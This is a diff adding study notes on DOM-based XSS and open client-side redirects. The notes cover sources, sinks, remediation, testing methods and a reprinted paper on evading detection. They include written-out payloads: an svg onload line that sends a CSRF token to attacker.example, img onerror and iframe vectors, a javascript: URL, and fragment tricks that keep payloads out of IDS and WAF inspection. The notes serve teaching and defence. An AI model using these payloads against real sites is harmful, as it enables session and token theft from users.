@@ -1,1 +1,570 @@
 
+DOM-BASED cross site scripting (DOM-XSS) :- 
+DOM-based cross-site scripting (XSS) is a client-side injection issue where an attacker inserts a malicious script into the Document Object Model (DOM) 
+modifying an application's behavior. The DOM is a standardized programming interface that enables applications and scripts to dynamically update the 
+structure, content, and layout of a web page.
+
+This vulnerability manifests itself throughout many different contexts. For example, the application may use untrusted input in JavaScript methods 
+and attributes that render HTML, such as:
+
+    element.innerHTML - a property that sets or gets the HTML syntax describing the element's descendants.
+    element.outerHTML - a property that sets or gets the HTML fragment describing the element and its descendants.
+
+The application could also be using untrusted data in JavaScript contexts that may execute JavaScript dynamically, such as:
+
+    eval - a function that evaluates its argument as JavaScript code.
+    setTimeOut - a function that evaluates a string after a specified number of milliseconds.
+    setInterval - a function that evaluates a string every specified number of milliseconds.
+    new Function - a constructor that creates JavaScript functions dynamically.
+    setAttribute - a function that sets an attribute on the specified element.
+    document.write and document.writeln - functions that write a string to a document. The string may contain HTML tags, as well as a script 
+                                          tag with JavaScript code.any event handler, as they execute JavaScript.
+
+
+Untrusted input can come from many sources including (but not limited to):
+
+    document.location - returns an object that contains information from the URI. The object also has methods for changing the URI or 
+                        loading another URI for browser redirection.
+    document.url - retrieves the URI as a string.
+    document.referer - returns the URI that linked to the current page.
+
+
+In a DOM-based XSS scenario, the attacker sends malicious strings to a victim's browser in such a way that the browser executes part of the string as code. 
+The main difference between DOM-based and traditional, server-side XSS is that in a DOM-based XSS attack the payload (malicious string) is injected during 
+runtime by the client, while in a traditional XSS it is injected into the application response during server-side processing and then sent to the browser.
+
+EX :-
+<p><b id='err'></b></p>
+<input type=hidden id=_csrf value="wS2sCg7DA0" />
+<script>document.getElementById('err').innerHTML = window.location.hash.substring(1);</script>
+
+https://example.com/updateItems.html#
+<svg/onload='document.write("<img src=http://attacker.example/listentodata?token="+document.getElementById("_csrf").value+" /></img>")'>
+
+In this case, the JavaScript code on the page adds the SVG tag to the "err" element via the "innerHTML" property. Once the SVG tag is added, 
+its "onload" method is called. That method executes the event handler which writes an image tag to the page with the source attribute set to 
+an attacker website. The source URL is dynamically created by concatenating the attacker's website URL and sensitive data from the victim's page, 
+such as the value of the CSRF token stored in the element with the "csrf" id. The element added to the page will look like the following:
+
+<img src="http://attacker.example/listentodata?token=wS2sCg7DA0">
+
+When the browser adds the image tag, it tries to fetch the image from the provided URL. Therefore, the attacker's website receives a request 
+exposing the victim's CSRF token in a GET parameter.
+
+Consequence
+Like in traditional XSS vulnerabilities, an attacker can steal any sensitive information from the page, arbitrarily alter the page content, 
+and execute application functions using the victim's identity if the victim is authenticated to the application.
+
+Remediation
+Use the correct remediation approach depending on the data context. Like traditional XSS mitigations, DOM-based XSS is mitigated using output 
+encoding and input validation. The output encoding technique should match the context where data is inserted, such as HTML, HTML attribute, URL 
+parameter, etc. Keep in mind that some contexts, such as the "href" attribute value, cannot be mitigated with output encoding alone and, therefore,
+require input validation. As the injection of untrusted data happens in the browser, the mitigation must be done in the client-side code.
+
+
+Different mitigation techniques apply to different JavaScript execution contexts:
+
+ 1.   HTML context. Use the correct element property, such as "textContent", "innerText" or "outerText", so that the inserted data is 
+      automatically output-encoded by the browser.
+ 2.   HTML attributes. When the "setAttribute()" function is used with untrusted data in both the name of the attribute and its value, 
+      use exact match to limit the attribute names that a user can set. These should only be safe attributes that do not execute JavaScript, 
+      such as "align", "alink", "alt", "value" and not event handlers or URI-type attributes. When untrusted data is used to set the value of 
+      the attribute, make sure that the attribute is not an event handler or a source. In addition, use input validation for the attribute's 
+      values, where appropriate (for example, for numeric values, such as "width", "height").
+ 3.   URL context. Use the exact match approach or mapping. If the application must allow users to provide any URL, at the minimum, validate the 
+       schema of the URL to avoid XSS through redirects to "javascript:" and "data:" URLs.
+ 4.   JavaScript context. Redesign the application so untrusted data is not used to dynamically create or modify JavaScript code. If a redesign is 
+      not possible, use exact match or allow-lists to validate data instead, since JavaScript encoding will not mitigate an injection into a string
+      that is dynamically evaluated by functions like "eval()", "new Function()", "document.write()", or an event handler.
+
+Remember that server-side validation will not protect the application from DOM-based XSS because in DOM-based injections the payload is evaluated on 
+the client side and not on the server side.
+
+For example, if untrusted data passed through the URL fragment must be added to the page, use the "innerText" property rather than "innerHTML". 
+In this case, if the data contains any HTML tags, they will be automatically encoded by the browser.
+
+<p><b id='err'></b></p>
+<input type=hidden id=_csrf value="wS2sCg7DA0" />
+<script>document.getElementById('err').innerText = window.location.hash.substring(1);</script>
+
+
+
+The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page 
+that is served to other users. Cross-site scripting (XSS) vulnerabilities occur when: Untrusted data enters a web application, typically from
+a web request. The web application dynamically generates a web page that contains this untrusted data. During page generation, the application
+does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse 
+events, Flash, ActiveX, etc. A victim visits the generated web page through a web browser, which contains malicious script that was injected 
+using the untrusted data. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the 
+malicious script in the context of the web server's domain. This effectively violates the intention of the web browser's same-origin policy,
+which states that scripts in one domain should not be able to access resources or run code in a different domain. There are three main kinds
+of XSS: Type 1: Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP 
+response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which
+is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include
+it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of
+many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the 
+attacker's content back to the victim, the content is executed by the victim's browser. Type 2: Stored XSS (or Persistent) - The application 
+stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently
+read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is 
+in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the
+application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may
+be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker
+might inject XSS into a log message, which might not be handled properly when an administrator views the logs. Type 0: DOM-Based XSS - In DOM-based 
+XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves
+server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it.
+If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based 
+XSS is possible. Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer 
+private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send 
+malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges
+to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker
+to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over
+the victim's machine, sometimes referred to as "drive-by hacking." In many cases, the attack can be launched without the victim even being aware of it. 
+Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode,
+so the request looks less suspicious.
+
+
+OPEN CLIENT SIDE URL REDIRECT :-
+
+The application contains an open client-side URL redirect. This vulnerability exists when client-side content redirects the user's browser 
+to a URL that was constructed using untrusted data. This redirect may be initiated by client-side JavaScript or by the user clicking a link 
+whose value has been set by an attacker-controlled parameter. In both cases, a vulnerable request parameter is used to set the URL for the 
+redirect, which can send a user to any URL or even the JavaScript URI scheme.
+
+Consequence
+1. Open client-side URL redirection allows an attacker to redirect a victim to a malicious website or a JavaScript URI which can be used to 
+    execute a cross-site scripting (XSS) attack.
+2. An attacker that redirects a user to a JavaScript URI will be able to arbitrarily alter page content with malicious JavaScript code.
+   The attacker can leverage a redirect in this manner to execute application functions entitled to the user or obtain the user's session identifier.
+
+Alternatively, if a user is redirected to a site that is fully under the attacker's control, the attacker can leverage the site to perform any number 
+of malicious actions. For example, the attacker may use this site to run scripts that install malware on the victim's system. The attacker can also 
+craft and display a page to the victim which is designed to mimic the legitimate application in order to trick the end user and steal their credentials.
+
+
+Remediation
+General Summary
+URLs constructed using untrusted data should be validated against a domain allow-list prior to redirect; when invalidated redirects are 
+required by the business, the application should request the user's permission prior to issuing the redirect. The verification of user-defined 
+URLs can take place on the server-side when the query parameter is processed or on the client-side before the redirection is actually executed.
+
+Primary
+When possible, the URL used to issue a redirect should not come from a user-controlled parameter. If a redirect can be issued to one of a set 
+of known URLs, a token representing the URL should be passed to the client and then matched against the corresponding URL on the server during 
+the initial redirect request rather than passing the entire URL from the client.
+
+If building a complete list of valid URLs is infeasible, the application should maintain an allow-list of safe domains and only accept relative 
+paths to pages or resources which it then appends to the domain. For example, an application may only want to redirect users within the domain "http://myhost.com". To prevent the redirect URL from exposing users to potentially unsafe sites, the application should only accept relative 
+paths (e.g. "/app1/index.jsp") from the user. The application logic should then be responsible for validating the data and constructing the 
+redirect URL by combining the allow-listed domain with the user-provided path.
+
+If the application must provide an open redirect function and cannot make any assumptions about the redirect destination URL, then the application
+should display an intermediate page that asks the user for confirmation prior to redirect.
+
+
+
+
+    CWE-601 URL Redirection to Untrusted Site ('Open Redirect')
+    A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. 
+    This simplifies phishing attacks. An http parameter may contain a URL value and could cause the web application to redirect the 
+    request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam
+    and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have 
+    a more trustworthy appearance.
+
+
+
+EX :- - Open Client-Side URL Redirect (Angular) Angular AngularJS JavaScript
+Summary
+The $window.location property enables developers to read from / write to the current browser location. The $window.location API exposes 
+the "raw" object with properties that can be directly modified. By setting the $window.location.href property to a URL, the application 
+will make the browser navigate to that page, even if it is outside of the current application domain. Therefore, if a developer does not 
+validate the data assigned to the location property, an attacker may execute an open redirect attack. Moreover, an attacker could use this
+vulnerability to perform a XSS attack by using a URL that starts with 'javascript:'.
+
+In the following example, the application authenticates a user and redirects them to a page of choice (e.g. welcome.html) upon successful 
+authentication. The code is vulnerable to an open redirect, as the untrusted variable goto is directly assigned to $window.location.href.
+
+var app = angular.module('myApp', []);
+
+app.controller('MainCtrl', function($scope, $window, $http) {
+  $scope.name = 'World';
+  $scope.submit=function()
+  {
+     if($scope.username && $scope.password)
+     {
+         var user=$scope.username;
+         var pass=$scope.password;
+         var redirecturl=$location.search().goto;
+         if(!redirecturl) { redirecturl='welcome.html';}
+         $http({
+             method: 'POST',
+             url: '/login',
+             data: "username:"+user+"&password:"+pass
+         }).then(function successCallback(response) {
+          $window.location.href = redirecturl;
+      }, function errorCallback(response) {
+        alert("Invalid Login");
+      });
+     }else{
+       alert("Invalid Login");
+     }
+  }
+});
+
+
+TESTING DOM-BASED XSS :::---
+
+1) Testing HTML sinks
+To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search), then use developer tools 
+to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because 
+it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use Control+F 
+(or Command+F on MacOS) to search the DOM for your string.
+
+For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your
+input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your
+string to see if you can break out of the attribute.
+
+Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode location.search and location.hash, 
+while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS
+attack is unlikely to work. 
+
+2) Testing JavaScript execution sinks
+Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere 
+within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is 
+sent to a sink.
+
+For each potential source, such as location, you first need to find cases within the page's JavaScript code where the source is being referenced.
+In Chrome's developer tools, you can use Control+Shift+F (or Command+Alt+F on MacOS) to search all the page's JavaScript code for the source.
+
+Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is 
+used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track
+these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use
+the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need 
+to refine your input to see if you can deliver a successful XSS attack. 
+
+3) Testing for DOM XSS using DOM Invader
+Identifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified
+JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard 
+work for you. 
+
+4) Exploiting DOM XSS with different sources and sinks
+In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from 
+source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine 
+what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated
+when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the list 
+below for details.
+
+The document.write sink works with script elements, so you can use a simple payload, such as the one below:
+document.write('... <script>alert(document.domain)</script> ...');
+
+5)  The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to 
+use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements.
+For example:
+element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
+
+6) DOM XSS in jQuery
+If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's
+attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the
+attr() function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes
+an anchor element's href attribute using data from the URL:
+$(function() {
+	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+
+You can exploit this by modifying the URL so that the location.search source contains a malicious JavaScript URL. After the page's JavaScript 
+applies this malicious URL to the back link's href, clicking on the back link will execute it:
+?returnUrl=javascript:alert(document.domain)
+
+7) Another potential sink to look out for is jQuery's $() selector function, which can be used to inject malicious objects into the DOM.
+
+jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the 
+location.hash source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable 
+hashchange event handler, similar to the following:
+$(window).on('hashchange', function() {
+	var element = $(location.hash);
+	element[0].scrollIntoView();
+});
+
+ As the hash is user controllable, an attacker could use this to inject an XSS vector into the $() selector sink. More recent versions of 
+jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash 
+character (#). However, you may still find vulnerable code in the wild.
+
+To actually exploit this classic vulnerability, you'll need to find a way to trigger a hashchange event without user interaction. One of the 
+simplest ways of doing this is to deliver your exploit via an iframe:
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+
+In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended
+to the hash, causing the hashchange event to fire.
+Note
+Even newer versions of jQuery can still be vulnerable via the $() selector sink, provided you have full control over its input from a source that 
+doesn't require a # prefix.
+
+8) DOM XSS in AngularJS
+If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the
+ng-app attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double 
+curly braces that can occur directly in HTML or inside attributes. 
+
+
+The ng-app directive tells AngularJS that this is the root element of the AngularJS application.
+All AngularJS applications must have a root element.
+You can only have one ng-app directive in your HTML document. If more than one ng-app directive appears, the first appearance will be used.
+EXAMPLE ::--
+<body ng-app="">
+<p>My first expression: {{ 5 + 5 }}</p>
+</body>
+
+
+9) DOM XSS combined with reflected and stored data
+Some pure DOM-based vulnerabilities are self-contained within a single page. If a script reads some data from the URL and writes it
+to a dangerous sink, then the vulnerability is entirely client-side.
+
+However, sources aren't limited to data that is directly exposed by browsers - they can also originate from the website. For example, 
+websites often reflect URL parameters in the HTML response from the server. This is commonly associated with normal XSS, but it can also
+lead to reflected DOM XSS vulnerabilities.
+
+In a reflected DOM XSS vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data 
+might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes
+the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+ex :- 
+eval('var data = "reflected string"');
+
+Websites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one 
+request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes 
+the data in an unsafe way.
+element.innerHTML = comment.author
+
+10) Reflected Dom XSS Vulnerabalities :-
+This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data 
+from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately 
+writing it to a dangerous sink
+
+    
+    The input \"-alert(1)}// is a string that appears to be attempting to exploit a potential vulnerability, likely related
+    to input sanitization or parsing issues in a web application. Let's break down what each part of this string does:
+    \": This is an escaped double quote character ("). It's common to escape characters in strings to include special characters like
+         quotes within a string.
+    -: This is a minus sign. It doesn't seem to serve any purpose in this context other than possibly trying to confuse or obfuscate the input.
+    alert(1): This is a JavaScript code snippet that triggers an alert dialog with the message "1". It's an attempt to execute arbitrary JavaScript 
+              code in the context of the application.
+    }: This is a closing curly brace. It's possible that it's intended to close an object or a function call if there is an open 
+       one somewhere in the application's code. However, in isolation like this, it seems out of place.
+    
+    //: This is the start of a JavaScript comment. Anything after // on the same line is considered a comment and ignored by the JavaScript
+        interpreter.
+    
+    Putting it all together, this input might be attempting to exploit a vulnerability by injecting JavaScript code (alert(1)) into the 
+    application. The - and } characters might be attempts to bypass input validation or to interfere with the application's parsing logic. 
+    The // at the end is likely an attempt to comment out any remaining code on the line to prevent syntax errors.
+    
+11) Which sinks can lead to DOM-XSS vulnerabilities?
+The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+
+
+
+Post a comment containing the following vector:
+<><img src=1 onerror=alert(1)>
+
+In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument 
+is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets
+at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to 
+effectively bypass the filter and inject HTML.
+
+
+The prerequisite is for the vulnerable site to have an HTML page that uses data from the document.location or document.URL or
+document.referrer (or any various other objects which the attacker can influence) in an insecure manner.
+
+ex :-
+<HTML>
+<TITLE>Welcome!</TITLE>
+Hi
+<SCRIPT>
+var pos=document.URL.indexOf("name=")+5;
+document.write(document.URL.substring(pos,document.URL.length));
+</SCRIPT>
+<BR>
+Welcome to our system
+</HTML>
+    
+http://www.vulnerable.site/welcome.html?name=Joe
+
+Notes:
+1. The malicious payload was not embedded in the raw HTML page at any time (unlike the other flavors of XSS).
+2. This exploit only works if the browser does not modify the URL characters. Mozilla automatically encodes < and > 
+(into %3C and %3E, respectively) in the document.URL when the URL is not directly typed at the address bar, and therefore it 
+is not vulnerable to the attack as shown in the example. It is vulnerable to attacks if < and > are not needed (in raw form). 
+Microsoft Internet Explorer 6.0 does not encode < and >, and is therefore vulnerable to the attack as-is.
+
+Of course, embedding in the HTML directly is just one attack mount point, there are various scenarios that do not require < and >,
+and therefore Mozilla in general is not immune from this attack.
+
+
+Evading standard detection and prevention technologies
+In the above example, it may be argued that still, the payload did arrive to the server (in the query part of the HTTP request),
+and so it can be detected just like any other XSS attack. But even that can be taken care of. Consider the following attack:
+
+
+http://www.vulnerable.site/welcome.html#name=
+<script>alert(document.cookie)<script>
+
+Notice the number sign (#) right after the file name. It tells the browser that everything beyond it is a fragment, i.e. not part of the
+query. Microsoft Internet Explorer (6.0) and Mozilla do not send the fragment to the server, and therefore, the server would see the equivalent 
+of http://www.vulnerable.site/welcome.html, so the payload would not even be seen by the server. We see, therefore, that this evasion technique
+causes the major browsers not to send the malicious payload to the server.
+
+
+Obviously, in situations where the payload can be completely hidden, online detection (IDS) and prevention (IPS, web application firewalls)
+products cannot fully defend against this attack, assuming the vulnerable script can indeed be invoked from a known location. Even if the payload
+has to be sent to the server, in many cases it can be crafted in such way to avoid being detected, e.g. if a specific parameter is protected 
+(e.g. the name parameter in the above example), then a slight variation of the attack may succeed:
+
+http://www.vulnerable.site/welcome.html?notname=
+<script>(document.cookie)</script>
+
+A more strict security policy would require that the name parameter be sent (to avoid the above tricks with names and number sign). 
+We can therefore send this:
+http://www.vulnerable.site/welcome.html?notname=
+<script>alert(document.cookie)<script>&name=Joe
+If the policy restricts the additional parameter name (e.g. to foobar), then the following variant would succeed:
+http://www.vulnerable.site/welcome.html?foobar=
+name=<script>alert(document.cookie)<script>&name=Joe
+Note that the ignored parameter (foobar) must come first, and it contains the payload in its value.
+The scenario in [7] is even better from the attacker’s perspective, since the full document.location is written to the HTML page
+(the Javascript code does not scan for a specific parameter name). Therefore, the attacker can completely hide the payload e.g. by sending:
+/attachment.cgi?id=&action=
+foobar#<script>alert(document.cookie)</script>
+Even if the payload is inspected by the server, protection can be guaranteed only if the request in its fullness is denied, or 
+if the response is replaced with some error text. Consider [5] and [6] again, if the Authorization header is simply removed by an
+intermediate protection system, it has no effect as long as the original page is returned. Likewise, any attempt to sanitize the 
+data on the server, either by removing the offending characters or by encoding them, is ineffective against this attack.
+
+In the case of document.referrer, the payload is sent to the server through the Referer header. However, if the user’s browser,
+or an intermediate device eliminates this header, then there’s no trace of the attack - it may go completely unnoticed.
+To generalize, traditional methods of:
+    HTML encoding output data at the server side
+    Removing/encoding offending input data at the server side
+Do not work well against DOM Based XSS.
+
+Regarding automatic vulnerability assessment by way of fault injection (sometimes called fuzzing) won’t work, since products that use 
+this technology typically evaluate the results according to whether the injected data is present in the response page or not (rather than
+execute the client side code in a browser context and observe the runtime effects). However, if a product is able to statically analyze a
+Javascript found in a page, then it may point out suspicious patterns (see below). And of course, if the product can execute the Javascript
+(and correctly populating the DOM objects), or simulate such execution, then it can detect this attack.
+
+Manual vulnerability assessment using a browser would work because the browser would execute the client side (Javascript) code. 
+Of course, a vulnerability assessment product may adopt this kind of technology and execute client side code to inspect the runtime effects.
+
+Effective defenses
+1. Avoiding client side document rewriting, redirection, or other sensitive actions, using client side data. Most of these effects can
+    be achieved by using dynamic pages (server side)
+2. Analyzing and hardening the client side (Javascript) code. Reference to DOM objects that may be influenced by the user (attacker) 
+   should be inspected, including (but not limited to):
+    document.URL
+    document.URLUnencoded
+    document.location (and many of its properties)
+    document.referrer
+    window.location (and many of its properties)
+Note that a document object property or a window object property may be referenced syntactically in many ways - explicitly (e.g. window.location),
+implicitly (e.g. location), or via obtaining a handle to a window and using it (e.g. handle_to_some_window.location).
+
+Special attention should be given to scenarios wherein the DOM is modified, either explicitly or potentially, either via raw access to the 
+HTML or via access to the DOM itself, e.g. (by no means an exhaustive list, there are probably various browser extensions):
+    Write raw HTML, e.g.:
+        document.write(…)
+        document.writeln(…)
+        document.body.innerHtml=…
+    Directly modifying the DOM (including DHTML events), e.g.:
+        document.forms[0].action=… (and various other collections)
+        document.attachEvent(…)
+        document.create…(…)
+        document.execCommand(…)
+        document.body. … (accessing the DOM through the body object)
+        window.attachEvent(…)
+    Replacing the document URL, e.g.:
+        document.location=… (and assigning to location’s href, host and hostname)
+        document.location.hostname=…
+        document.location.replace(…)
+        document.location.assign(…)
+        document.URL=…
+        window.navigate(…)
+    Opening/modifying a window, e.g.:
+        document.open(…)
+        window.open(…)
+        window.location.href=… (and assigning to location’s href, host and hostname)
+    Directly executing script, e.g.:
+        eval(…)
+        window.execScript(…)
+        window.setInterval(…)
+        window.setTimeout(…)
+
+To continue the above example, an effective defense can be replacing the original script part with the following code, which verifies 
+that the string written to the HTML page consists of alphanumeric characters only:
+<SCRIPT>
+var pos=document.URL.indexOf("name=")+5;
+var name=document.URL.substring(pos,document.URL.length);
+if (name.match(/^[a-zA-Z0-9]*$/))
+{
+      document.write(name);
+}
+else
+{
+      window.alert("Security error");
+}
+</SCRIPT>
+
+Such functionality can (and perhaps should) be provided through a generic library for sanitation of data (i.e. a set of Javascript functions 
+that perform input validation and/or sanitation). The downside is that the security logic is exposed to the attackers - it is embedded in the
+HTML code. This makes it easier to understand and to attack it. While in the above example, the situation is very simple, in more complex
+scenarios wherein the security checks are less than perfect, this may come to play.
+
+ 
+
+3. Employing a very strict IPS policy in which, for example, page welcome.html is expected to receive a one only parameter named “name”, whose
+content is inspected, and any irregularity (including excessive parameters or no parameters) results in not serving the original page, likewise
+with any other violation (such as an Authorization header or Referer header containing problematic data), the original content must not be served.
+And in some cases, even this cannot guarantee that an attack will be thwarted.
+
+A note about redirection vulnerabilities
+The above discussion is on XSS, yet in many cases, merely using a client side script to (insecurely) redirect the browser to another location
+is considered vulnerability in itself. In such cases, the above techniques and observations still apply.
+
+Conclusion
+
+While most XSS attacks described in public do indeed depend on the server physically embedding user data into the response HTML pages, there are 
+XSS attacks that do not rely on server side embedding of the data. This has material significance when discussing ways to detect and prevent XSS.
+To date, almost all detection and prevention techniques discussed in public assume that XSS implies that the server receives malicious user input
+and embeds it in an HTML page. Since this assumption doesn’t hold (or only very partially holds) for the XSS attacks described in this paper, many 
+of the techniques fail to detect and prevent this kind of attacks.
+
+The XSS attacks that rely on server side embedding of user data are categorized into “non-persistent” (or “reflected”) and “persistent” (or “stored”). 
+It is thus suggested that the third kind of XSS, the one that does not rely on server side embedding, be named “DOM Based XSS”.
+Here is a comparison between standard XSS and DOM Based XSS:
+	
+
+
+
